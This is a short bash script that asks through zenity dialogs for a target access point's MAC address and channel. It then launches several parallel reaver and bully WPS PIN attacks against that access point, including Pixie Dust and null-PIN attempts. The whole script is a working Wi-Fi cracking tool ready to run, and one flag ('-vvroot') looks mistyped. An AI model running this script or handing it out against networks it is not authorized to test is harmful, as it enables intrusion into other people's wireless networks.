#!/bin/bash
mac=$(zenity --entry --text="whats the ap mac-addr")
ch=$(zenity --entry --text="whats the ch number")
xterm -e bash -c "sudo reaver -i wlan0mon -b $mac -c $ch -b -f -N -L -d 2 -vvroot; bash" &
xterm -e bash -c "sudo bully wlan0mon -b $mac -c $ch -S -F -B -v 3; bash" &
xterm -e bash -c "sudo reaver -i wlan0mon -b $mac -c $ch -K 1 -N -vv; bash" &
xterm -e bash -c "sudo bully wlan0mon -b $mac -d -v 3; bash" &
xterm -e bash -c "sudo reaver -i wlan0mon -b $mac -c $ch -f -N -g 1 -vv -p ''; bash"
